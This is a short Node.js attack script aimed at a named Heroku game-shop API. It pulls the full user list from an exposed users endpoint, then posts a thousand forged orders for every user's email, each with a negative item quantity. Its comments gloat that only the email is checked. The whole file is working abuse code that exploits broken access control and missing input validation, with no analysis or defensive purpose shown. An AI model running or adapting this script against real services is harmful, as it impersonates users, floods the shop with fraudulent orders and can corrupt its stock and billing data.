const axios = require('axios')

const url = "https://game-shopper.herokuapp.com/api/orders"
const data = {
  "email": "orlando@fullstack.com", // this will get overwritten
  "items": [{
    "id": 1,
    "qty": -1,
  }],
};


(async function () {
  // grab all the users
  const { data: users } = await axios.get('https://game-shopper.herokuapp.com/api/users')
  for (let i = 0; i < 1000; i++) {
    // make 1000 orders for each user
    await Promise.all(
      users.map(user => axios.post(url, {
        ...data,
        email: user.email, // only thing that is checked is email
        // good thing they left the get all users route :)
      }))
    )
    console.log(i)
  }
})()
